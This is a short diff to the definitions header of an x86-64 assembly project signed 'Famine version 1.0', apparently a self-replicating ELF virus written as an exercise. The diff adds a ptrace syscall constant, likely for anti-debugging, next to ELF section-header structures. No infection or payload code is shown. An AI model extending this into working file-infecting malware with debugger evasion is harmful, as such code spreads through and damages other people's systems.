@@ -33,6 +33,7 @@
 %define SYS_MUNMAP 11
 %define SYS_EXIT 60
 %define SYS_RENAME 82
+%define SYS_PTRACE 101
 %define SYS_GETDENTS 217
 
 %define SIGNATURE "Famine version 1.0 (c)oded by dbaffier"
@@ -145,6 +146,8 @@ struc shdr64
     .sh_addralign:       resq 1
     .sh_entsize:         resq 1
 endstruc
+
+
 
 ; DB allocates in chunks of 1 byte.
 ; DW allocates in chunks of 2 bytes.
